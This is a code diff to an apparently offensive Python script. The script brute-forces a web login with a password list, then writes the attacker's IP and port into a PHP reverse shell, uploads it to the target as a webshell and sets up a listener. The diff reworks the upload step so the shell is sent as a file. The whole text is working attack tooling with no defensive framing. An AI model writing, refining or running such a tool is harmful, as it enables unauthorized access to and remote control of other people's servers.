@@ -14,16 +14,18 @@ def brute_force_login(target_url, username, password_list_file):
             return password  # Return found password
     return None
 
-def inject_reverse_shell(upload_url, reverse_shell_template, ip, port):
-    # Replace placeholders with user-specified values
-    reverse_shell_payload = reverse_shell_template.replace('YOUR_IP', ip).replace('YOUR_PORT', str(port))
-    
-    response = requests.post(upload_url, data={'file': reverse_shell_payload})
+def inject_reverse_shell(upload_url, shell_file_path):
+    # Open the PHP reverse shell as binary
+    with open(shell_file_path, 'rb') as file:
+        files = {'file': file}
 
-    if response.status_code == 200:
-        print("Payload uploaded successfully!")
-    else:
-        print("Failed to upload payload.")
+        # Upload the reverse shell
+        response = requests.post(upload_url, files=files)
+
+        if response.status_code == 200:
+            print("Webshell uploaded successfully!")
+        else:
+            print("Failed to upload webshell.")
 
 def setup_listener(port):
     print(f"Setting up listener on port {port}...")
@@ -43,10 +45,17 @@ def main():
     if args.action == 'brute':
         found_password = brute_force_login(args.target, args.username, args.passwords)
         if found_password:
-            # Prepare the reverse shell payload
+            # Prepare the reverse shell payload with replaced IP/Port
             with open('reverse_shell.php', 'r') as file:
                 reverse_shell_template = file.read()
-            inject_reverse_shell(args.target, reverse_shell_template, args.ip, args.port)
+
+            # Save the modified reverse shell
+            shell_file_path = 'reverse_shell.php'
+            with open(shell_file_path, 'w') as file:
+                file.write(reverse_shell_template.replace('YOUR_IP', args.ip).replace('YOUR_PORT', str(args.port)))
+
+            # Inject the modified reverse shell
+            inject_reverse_shell(args.target, shell_file_path)
     
     elif args.action == 'listen':
         setup_listener(args.port)
